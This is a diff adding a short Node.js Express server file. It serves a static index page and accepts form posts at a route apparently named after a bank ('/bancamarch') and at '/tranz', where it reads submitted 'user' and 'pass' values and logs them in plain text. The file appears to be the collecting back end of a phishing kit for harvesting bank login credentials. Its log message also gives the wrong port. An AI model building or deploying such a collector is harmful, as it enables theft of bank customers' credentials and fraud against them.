@@ -1,0 +1,48 @@
+//nodeserver
+
+
+var express        =         require("express");
+var bodyParser     =         require("body-parser");
+var app            =         express();
+var app2            =         express();
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+app.use('/public', express.static('public'));
+
+app.get('/',function(req,res){
+  res.sendfile("public/index.html");
+});
+app.post('/bancamarch',function(req,res){
+  var json=req.body.json;
+  
+  //console.log(json);
+  res.end("yes");
+});
+app.listen(3000,function(){
+  console.log("Started on PORT 3000");
+})
+
+
+
+
+app2.use(bodyParser.urlencoded({ extended: false }));
+app2.use(bodyParser.json());
+
+app2.use(express.static(__dirname + '/public'));
+
+app2.get('/',function(req,res){
+  res.sendfile("public/index.html");
+});
+
+app2.post('/tranz',function(req,res){
+  var user=req.body.user;
+  var pass=req.body.pass;
+  
+  console.log(user+' '+pass);
+  res.end("yes");
+});
+app2.listen(3001,function(){
+  console.log("Started on PORT 80");
+})
